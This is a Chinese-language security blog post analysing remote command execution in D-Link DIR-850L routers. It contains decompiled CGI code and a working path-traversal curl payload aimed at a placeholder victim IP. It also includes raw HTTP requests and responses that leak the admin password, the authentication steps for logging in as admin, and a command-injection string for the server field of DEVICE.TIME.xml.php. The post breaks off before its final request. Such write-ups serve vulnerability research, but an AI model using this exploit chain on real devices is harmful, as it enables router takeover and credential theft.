<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<hr/>
<p><strong>0x01dlink850l远程命令执行漏洞</strong><br/>
<img src="https://img-blog.csdnimg.cn/20200327210418176.png"/><br/>
当管理员接口的配置信息发生改变时，变化的配置信息会以 xml 的数据格式发送给 hedwig.cgi ，由 hedwig.cgi 重载并应用这些配置信息，而在接受这个数据前，程序并没有对用户身份进行判断，导致非管理员用户也可向 hedwig.cgi 发送XML数据。在接收 XML 数据的过程中， hedwig.cgi 会调用 htdocs/webinc/fatlady.php 文件验证数据合法性。</p>
<p>hedwig.cgi其实是一个链接文件，指向/htdocs/cgibin文件，接收到用户请求的xml数据请求后先封装成xml文件，发送read xml的请求到xmldb server，然后发送execute php的请求到xmldb server。<br/>
hedwig.cgi</p>
<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="nf">hedwigcgi_main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>

<span class="p">{</span>
  <span class="kt">bool</span> <span class="n">bVar1</span><span class="p">;</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">__s1</span><span class="p">;</span>
  <span class="kt">FILE</span> <span class="o">*</span><span class="n">__stream</span><span class="p">;</span>
  <span class="n">undefined</span> <span class="o">*</span><span class="n">puVar2</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">__fd</span><span class="p">;</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">pvVar3</span><span class="p">;</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">pvVar4</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">__fd_00</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">iVar5</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">iVar6</span><span class="p">;</span>
  <span class="kt">char</span> <span class="o">**</span><span class="n">ppcVar7</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">acStack1232</span> <span class="p">[</span><span class="mi">20</span><span class="p">];</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">local_4bc</span> <span class="p">[</span><span class="mi">5</span><span class="p">];</span>
  <span class="kt">char</span> <span class="n">acStack1192</span> <span class="p">[</span><span class="mi">128</span><span class="p">];</span>
  <span class="kt">char</span> <span class="n">acStack1064</span> <span class="p">[</span><span class="mi">1024</span><span class="p">];</span>

  <span class="n">memset</span><span class="p">(</span><span class="n">acStack1064</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x400</span><span class="p">);</span>
  <span class="n">memset</span><span class="p">(</span><span class="n">acStack1192</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x80</span><span class="p">);</span>
  <span class="n">memcpy</span><span class="p">(</span><span class="n">acStack1232</span><span class="p">,</span><span class="s">"/runtime/session"</span><span class="p">,</span><span class="mh">0x11</span><span class="p">);</span>
  <span class="n">__s1</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">"REQUEST_METHOD"</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">__s1</span> <span class="o">==</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">__s1</span> <span class="o">=</span> <span class="s">"no REQUEST"</span><span class="p">;</span>
<span class="nl">LAB_0040d1bc</span><span class="p">:</span>
    <span class="n">pvVar3</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span>
    <span class="n">pvVar4</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span>
<span class="nl">LAB_0040d5f4</span><span class="p">:</span>
    <span class="n">__fd_00</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="n">__fd_00</span> <span class="o">=</span> <span class="n">strcasecmp</span><span class="p">(</span><span class="n">__s1</span><span class="p">,</span><span class="s">"POST"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">__fd_00</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">__s1</span> <span class="o">=</span> <span class="s">"unsupported HTTP request"</span><span class="p">;</span>
      <span class="k">goto</span> <span class="n">LAB_0040d1bc</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">cgibin_parse_request</span><span class="p">(</span><span class="o">&amp;</span><span class="n">LAB_0040d5fc</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x20000</span><span class="p">);</span>
    <span class="n">__stream</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"/etc/config/image_sign"</span><span class="p">,</span><span class="s">"r"</span><span class="p">);</span>  <span class="c1">//读取文件载入硬件版本</span>
    <span class="n">__s1</span> <span class="o">=</span> <span class="n">fgets</span><span class="p">(</span><span class="n">acStack1192</span><span class="p">,</span><span class="mh">0x80</span><span class="p">,</span><span class="n">__stream</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">__s1</span> <span class="o">==</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">__s1</span> <span class="o">=</span> <span class="s">"unable to read signature!"</span><span class="p">;</span>
      <span class="k">goto</span> <span class="n">LAB_0040d1bc</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">fclose</span><span class="p">(</span><span class="n">__stream</span><span class="p">);</span>
    <span class="n">cgibin_reatwhite</span><span class="p">(</span><span class="n">acStack1192</span><span class="p">);</span>
    <span class="n">pvVar3</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">sobj_new</span><span class="p">();</span>
    <span class="n">pvVar4</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">sobj_new</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">pvVar3</span> <span class="o">==</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">pvVar4</span> <span class="o">==</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">))</span> <span class="p">{</span>
      <span class="n">__s1</span> <span class="o">=</span> <span class="s">"unable to allocate string object"</span><span class="p">;</span>
      <span class="k">goto</span> <span class="n">LAB_0040d5f4</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">sess_get_uid</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">pvVar3</span><span class="p">);</span>
    <span class="n">puVar2</span> <span class="o">=</span> <span class="n">sobj_get_string</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">pvVar3</span><span class="p">);</span>
    <span class="n">snprintf</span><span class="p">(</span><span class="n">acStack1064</span><span class="p">,</span><span class="mh">0x400</span><span class="p">,</span><span class="s">"%s/%s/postxml"</span><span class="p">,</span><span class="s">"/runtime/session"</span><span class="p">,</span><span class="n">puVar2</span><span class="p">);</span>
    <span class="n">xmldbc_del</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">acStack1064</span><span class="p">);</span>   <span class="c1">//删掉临时文件</span>
    <span class="n">__stream</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"/var/tmp/temp.xml"</span><span class="p">,</span><span class="s">"w"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">__stream</span> <span class="o">==</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">__s1</span> <span class="o">=</span> <span class="s">"unable to open temp file."</span><span class="p">;</span>
      <span class="k">goto</span> <span class="n">LAB_0040d5f4</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">DAT_00437f30</span> <span class="o">==</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">__s1</span> <span class="o">=</span> <span class="s">"no xml data."</span><span class="p">;</span>
      <span class="k">goto</span> <span class="n">LAB_0040d5f4</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">__fd_00</span> <span class="o">=</span> <span class="n">fileno</span><span class="p">(</span><span class="n">__stream</span><span class="p">);</span>
    <span class="n">__fd_00</span> <span class="o">=</span> <span class="n">lockf</span><span class="p">(</span><span class="n">__fd_00</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">__fd_00</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span>
             <span class="s">"HTTP/1.1 200 OK</span><span class="se">\r\n</span><span class="s">Content-Type:text/xml</span><span class="se">\r\n\r\n</span><span class="s">&lt;hedwig&gt;&lt;result&gt;BUSY&lt;/result&gt;&lt;message&gt;%s&lt;/message&gt;&lt;/hedwig&gt;"</span>
             <span class="p">,</span><span class="mi">0</span><span class="p">);</span>
      <span class="n">__fd_00</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="k">goto</span> <span class="n">LAB_0040d570</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">ppcVar7</span> <span class="o">=</span> <span class="n">local_4bc</span> <span class="o">+</span> <span class="mi">2</span><span class="p">;</span>
    <span class="n">__fd</span> <span class="o">=</span> <span class="n">fileno</span><span class="p">(</span><span class="n">__stream</span><span class="p">);</span>
    <span class="n">lockf</span><span class="p">(</span><span class="n">__fd</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">local_4bc</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span>
    <span class="n">local_4bc</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">local_4bc</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">local_4bc</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">local_4bc</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">acStack1192</span><span class="p">;</span>
    <span class="n">local_4bc</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">strtok</span><span class="p">(</span><span class="n">acStack1232</span><span class="p">,</span><span class="s">"/"</span><span class="p">);</span>
    <span class="n">__fd</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="k">do</span> <span class="p">{</span>
      <span class="n">iVar6</span> <span class="o">=</span> <span class="n">__fd</span><span class="p">;</span>
      <span class="n">__fd</span> <span class="o">=</span> <span class="n">iVar6</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
      <span class="n">__s1</span> <span class="o">=</span> <span class="n">strtok</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="s">"/"</span><span class="p">);</span>
      <span class="o">*</span><span class="n">ppcVar7</span> <span class="o">=</span> <span class="n">__s1</span><span class="p">;</span>
      <span class="n">ppcVar7</span> <span class="o">=</span> <span class="n">ppcVar7</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">__s1</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
    <span class="n">ppcVar7</span> <span class="o">=</span> <span class="n">local_4bc</span><span class="p">;</span>
    <span class="n">iVar5</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">__s1</span> <span class="o">=</span> <span class="n">sobj_get_string</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">pvVar3</span><span class="p">);</span>
    <span class="n">local_4bc</span><span class="p">[</span><span class="n">iVar6</span><span class="p">]</span> <span class="o">=</span> <span class="n">__s1</span><span class="p">;</span>
    <span class="n">fputs</span><span class="p">(</span><span class="s">"&lt;?xml version=</span><span class="se">\"</span><span class="s">1.0</span><span class="se">\"</span><span class="s"> encoding=</span><span class="se">\"</span><span class="s">UTF-8</span><span class="se">\"</span><span class="s">?&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">__stream</span><span class="p">);</span>
    <span class="n">bVar1</span> <span class="o">=</span> <span class="mi">0</span> <span class="o">&lt;</span> <span class="n">__fd</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">iVar5</span> <span class="o">=</span> <span class="n">iVar5</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">bVar1</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">__s1</span> <span class="o">=</span> <span class="o">*</span><span class="n">ppcVar7</span><span class="p">;</span>
      <span class="n">ppcVar7</span> <span class="o">=</span> <span class="n">ppcVar7</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
      <span class="n">fprintf</span><span class="p">(</span><span class="n">__stream</span><span class="p">,</span><span class="s">"&lt;%s&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">__s1</span><span class="p">);</span>
      <span class="n">bVar1</span> <span class="o">=</span> <span class="n">iVar5</span> <span class="o">&lt;</span> <span class="n">__fd</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">__s1</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">DAT_00437f30</span><span class="p">,</span><span class="s">"&lt;postxml&gt;"</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">__stream</span><span class="p">,</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">__s1</span><span class="p">);</span>
    <span class="n">ppcVar7</span> <span class="o">=</span> <span class="n">local_4bc</span> <span class="o">+</span> <span class="n">iVar6</span><span class="p">;</span>
    <span class="k">do</span> <span class="p">{</span>
      <span class="n">__fd</span> <span class="o">=</span> <span class="n">__fd</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
      <span class="n">__s1</span> <span class="o">=</span> <span class="o">*</span><span class="n">ppcVar7</span><span class="p">;</span>
      <span class="n">ppcVar7</span> <span class="o">=</span> <span class="n">ppcVar7</span> <span class="o">+</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
      <span class="n">fprintf</span><span class="p">(</span><span class="n">__stream</span><span class="p">,</span><span class="s">"&lt;/%s&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">__s1</span><span class="p">);</span><span class="c1">//写入/var/tmp/temp.xml"</span>
    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="mi">0</span> <span class="o">&lt;</span> <span class="n">__fd</span><span class="p">);</span>
    <span class="n">fflush</span><span class="p">(</span><span class="n">__stream</span><span class="p">);</span>
    <span class="n">xmldbc_read</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="s">"/var/tmp/temp.xml"</span><span class="p">);</span> <span class="c1">//被其他文件读取</span>
    <span class="n">__fd</span> <span class="o">=</span> <span class="n">fileno</span><span class="p">(</span><span class="n">__stream</span><span class="p">);</span>
    <span class="n">lockf</span><span class="p">(</span><span class="n">__fd</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">fclose</span><span class="p">(</span><span class="n">__stream</span><span class="p">);</span>
    <span class="n">remove</span><span class="p">(</span><span class="s">"/var/tmp/temp.xml"</span><span class="p">);</span>  <span class="c1">//删掉</span>
    <span class="n">puVar2</span> <span class="o">=</span> <span class="n">sobj_get_string</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">pvVar3</span><span class="p">);</span>
    <span class="n">snprintf</span><span class="p">(</span><span class="n">acStack1064</span><span class="p">,</span><span class="mh">0x400</span><span class="p">,</span><span class="s">"/htdocs/webinc/fatlady.php</span><span class="se">\n</span><span class="s">prefix=%s/%s"</span><span class="p">,</span><span class="s">"/runtime/session"</span><span class="p">,</span><span class="n">puVar2</span><span class="p">)</span>     <span class="c1">//这里读取/htdocs/webinc/fatlady.php</span>
    <span class="p">;</span>
    <span class="n">xmldbc_ephp</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">acStack1064</span><span class="p">,</span><span class="n">stdout</span><span class="p">);</span><span class="c1">// 运行刚才读取的/htdocs/webinc/fatlady.php</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">__fd_00</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">goto</span> <span class="n">LAB_0040d570</span><span class="p">;</span>
    <span class="n">__s1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span>
         <span class="s">"HTTP/1.1 200 OK</span><span class="se">\r\n</span><span class="s">Content-Type:text/xml</span><span class="se">\r\n\r\n</span><span class="s">&lt;hedwig&gt;&lt;result&gt;FAILED&lt;/result&gt;&lt;message&gt;%s&lt;/message&gt;&lt;/hedwig&gt;"</span>
         <span class="p">,</span><span class="n">__s1</span><span class="p">);</span>
<span class="nl">LAB_0040d570</span><span class="p">:</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">DAT_00437f30</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">free</span><span class="p">(</span><span class="n">DAT_00437f30</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">pvVar4</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">sobj_del</span><span class="p">(</span><span class="n">pvVar4</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">pvVar3</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">sobj_del</span><span class="p">(</span><span class="n">pvVar3</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">__fd_00</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>跟上一篇类似的插入<br/>
参考<a href="https://blog.csdn.net/qq_38204481/article/details/105113896" target="_blank">https://blog.csdn.net/qq_38204481/article/details/105113896</a></p>
<p>fatlady.php</p>
<div class="highlight"><pre><span></span><span class="x">HTTP/1.1 200 OK</span>
<span class="x">Content-Type: text/xml</span>

<span class="cp">&lt;?</span>
<span class="k">include</span> <span class="s2">"/htdocs/phplib/trace.php"</span><span class="p">;</span>

<span class="cm">/* get modules that send from hedwig */</span>
<span class="cm">/* call $target to do error checking, </span>
<span class="cm"> * and it will modify and return the variables, '$FATLADY_XXXX'. */</span>
<span class="nv">$FATLADY_result</span> <span class="o">=</span> <span class="s2">"OK"</span><span class="p">;</span>
<span class="nv">$FATLADY_node</span>   <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
<span class="nv">$FATLADY_message</span><span class="o">=</span> <span class="s2">"No modules for Hedwig"</span><span class="p">;</span>  <span class="cm">/* this should not happen */</span>

<span class="c1">//TRACE_debug("FATLADY dump ====================\n".dump(0, "/runtime/session"));</span>

<span class="k">foreach</span> <span class="p">(</span><span class="nv">$prefix</span><span class="o">.</span><span class="s2">"/postxml/module"</span><span class="p">)</span>
<span class="p">{</span>
    <span class="nx">del</span><span class="p">(</span><span class="s2">"valid"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">query</span><span class="p">(</span><span class="s2">"FATLADY"</span><span class="p">)</span><span class="o">==</span><span class="s2">"ignore"</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>  
    <span class="nv">$service</span> <span class="o">=</span> <span class="nx">query</span><span class="p">(</span><span class="s2">"service"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$service</span> <span class="o">==</span> <span class="s2">""</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
    <span class="nx">TRACE_debug</span><span class="p">(</span><span class="s2">"FATLADY: got service ["</span><span class="o">.</span><span class="nv">$service</span><span class="o">.</span><span class="s2">"]"</span><span class="p">);</span>
    <span class="nv">$target</span> <span class="o">=</span> <span class="s2">"/htdocs/phplib/fatlady/"</span><span class="o">.</span><span class="nv">$service</span><span class="o">.</span><span class="s2">".php"</span><span class="p">;</span>  <span class="cm">/*FATLADY != ignore ，service字段可以直接被拼接并执行*/</span>
    <span class="nv">$FATLADY_prefix</span> <span class="o">=</span> <span class="nv">$prefix</span><span class="o">.</span><span class="s2">"/postxml/module:"</span><span class="o">.</span><span class="nv">$InDeX</span><span class="p">;</span>
    <span class="nv">$FATLADY_base</span>   <span class="o">=</span> <span class="nv">$prefix</span><span class="o">.</span><span class="s2">"/postxml"</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">isfile</span><span class="p">(</span><span class="nv">$target</span><span class="p">)</span><span class="o">==</span><span class="mi">1</span><span class="p">)</span> <span class="nx">dophp</span><span class="p">(</span><span class="s2">"load"</span><span class="p">,</span> <span class="nv">$target</span><span class="p">);</span>
    <span class="k">else</span>
    <span class="p">{</span>
        <span class="nx">TRACE_debug</span><span class="p">(</span><span class="s2">"FATLADY: no file - "</span><span class="o">.</span><span class="nv">$target</span><span class="p">);</span>
        <span class="nv">$FATLADY_result</span> <span class="o">=</span> <span class="s2">"FAILED"</span><span class="p">;</span>
        <span class="nv">$FATLADY_message</span> <span class="o">=</span> <span class="s2">"No implementation for "</span><span class="o">.</span><span class="nv">$service</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$FATLADY_result</span><span class="o">!=</span><span class="s2">"OK"</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">echo</span> <span class="s2">"&lt;?xml version=</span><span class="se">\"</span><span class="s2">1.0</span><span class="se">\"</span><span class="s2"> encoding=</span><span class="se">\"</span><span class="s2">utf-8</span><span class="se">\"</span><span class="s2">?&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">"&lt;hedwig&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">&lt;result&gt;"</span><span class="o">.</span>  <span class="nv">$FATLADY_result</span><span class="o">.</span>    <span class="s2">"&lt;/result&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">&lt;node&gt;"</span><span class="o">.</span>    <span class="nv">$FATLADY_node</span><span class="o">.</span>      <span class="s2">"&lt;/node&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">&lt;message&gt;"</span><span class="o">.</span> <span class="nv">$FATLADY_message</span><span class="o">.</span>   <span class="s2">"&lt;/message&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">"&lt;/hedwig&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>利用payload</p>
<div class="highlight"><pre><span></span>curl -d <span class="s1">'&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;postxml&gt;&lt;module&gt;&lt;service&gt;../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml&lt;/service&gt;&lt;/module&gt;&lt;/postxml&gt;'</span> -b <span class="s2">"uid=demo"</span> -H <span class="s2">"Content-Type: text/xml"</span> <span class="s2">"http://VictimIp:8080/hedwig.cgi"</span>
</pre></div>
<p>抓包<br/>
<img src="https://img-blog.csdnimg.cn/2020033009334574.png"/><br/>
附加xml的post请求发送过去的命令触发漏洞<br/>
<strong>0x02dlink850l 命令执行漏洞获取shell</strong></p>
<p><strong>用./hedwig.cgi文件加载的fatlady.phpphp文件直接加载漏洞加载DEVICE.ACCOUNT.xml.php文件获取用户名，密码</strong><br/>
请求：</p>
<pre><code>POST /hedwig.cgi HTTP/1.1
Host: 192.168.0.1
User-Agent: python-requests/2.18.4
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Type: text/xml
Cookie: uid=whatever
Content-Length: 150

&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;postxml&gt;
&lt;module&gt;
    &lt;service&gt;../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml&lt;/service&gt;
&lt;/module&gt;
&lt;/postxml&gt;</code></pre>
<p>回应：</p>
<pre><code>HTTP/1.1 200 OK
Server: Linux, HTTP/1.1, DIR-850L Ver 1.14WW
Date: Fri, 27 May 2016 00:02:46 GMT
Transfer-Encoding: chunked
Content-Type: text/xml

&lt;module&gt;
    &lt;service&gt;&lt;/service&gt;
    &lt;device&gt;
        &lt;gw_name&gt;DIR-850L&lt;/gw_name&gt;

        &lt;account&gt;
            &lt;seqno&gt;1&lt;/seqno&gt;
            &lt;max&gt;2&lt;/max&gt;
            &lt;count&gt;1&lt;/count&gt;
            &lt;entry&gt;
                &lt;uid&gt;USR-&lt;/uid&gt;
                &lt;name&gt;Admin&lt;/name&gt;
                &lt;usrid&gt;&lt;/usrid&gt;
                &lt;password&gt;root1996&lt;/password&gt;
                &lt;group&gt;0&lt;/group&gt;
                &lt;description&gt;&lt;/description&gt;
            &lt;/entry&gt;
        &lt;/account&gt;
        &lt;group&gt;
            &lt;seqno&gt;&lt;/seqno&gt;
            &lt;max&gt;&lt;/max&gt;
            &lt;count&gt;0&lt;/count&gt;
        &lt;/group&gt;
        &lt;session&gt;
            &lt;captcha&gt;0&lt;/captcha&gt;
            &lt;dummy&gt;&lt;/dummy&gt;
            &lt;timeout&gt;600&lt;/timeout&gt;
            &lt;maxsession&gt;128&lt;/maxsession&gt;
            &lt;maxauthorized&gt;16&lt;/maxauthorized&gt;
        &lt;/session&gt;
    &lt;/device&gt;
&lt;/module&gt;
&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;hedwig&gt;
    &lt;result&gt;OK&lt;/result&gt;
    &lt;node&gt;&lt;/node&gt;
    &lt;message&gt;No modules for Hedwig&lt;/message&gt;
&lt;/hedwig&gt;</code></pre>
<p><strong>/authentication.cgi 登录</strong></p>
<p>a&gt;获取到登录的 uid，callenge，使用GET请求</p>
<pre><code>GET /authentication.cgi HTTP/1.1
Host: 192.168.0.1
User-Agent: python-requests/2.18.4
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive</code></pre>
<p>回应</p>
<pre><code>HTTP/1.1 200 OK
Server: Linux, HTTP/1.1, DIR-850L Ver 1.14WW
Date: Fri, 27 May 2016 00:02:46 GMT
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded

{"status": "ok", "errno": null, "uid": "0764udul3Z", "challenge": "d4efd41c-4595-4a16-b5b5-0d90dca490ca", "version": "0204"}
POST /authentication.cgi HTTP/1.1</code></pre>
<pre><code>b&gt;使用uid键值对作为cookie，password与username+challenge作md5，发送post请求</code></pre>
<pre><code>POST /authentication.cgi HTTP/1.1
Host: 192.168.0.1
User-Agent: python-requests/2.18.4
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Cookie: uid=0764udul3Z
Content-Length: 50
Content-Type: application/x-www-form-urlencoded

id=Admin&amp;password=7499059A6F694AD6117790A807038807</code></pre>
<p>接下来将作为root用户获取shell<br/>
<strong>用/getcfg.php执行DEVICE.TIME.xml.php文件</strong><br/>
/getcfg.php文件里面是<br/>
从post过去的信息中获取SERVICES字段执行对应php文件（其实这里有一个漏洞，执行这个php文件可以不用拿到admin用户的密码）<img src="https://img-blog.csdnimg.cn/20200330093938307.png"/><br/>
执行的getcfg.php文件可以设置SERVICES字段可以运行另一个文件DEVICE.TIME.xml.php<br/>
DEVICE.TIME.xml.php文件有命令执行漏洞<br/>
<img src="https://img-blog.csdnimg.cn/20200330094056191.png"/><br/>
query函数会获取post携带的xml文件里面的对应标签的数值，类似python的xpath<br/>
fwrite函数是写入数据流中，a是追加，应该是把这些命令写入文件之后执行(这里可以是一个赋值语句如果$server设置为<code>"metelesku; ("+COMMAND+") &amp; exit;</code> "就会造成截断)<br/>
可以看到server字段被直接写入文件造成了命令执行。<br/>
发送报文</p>
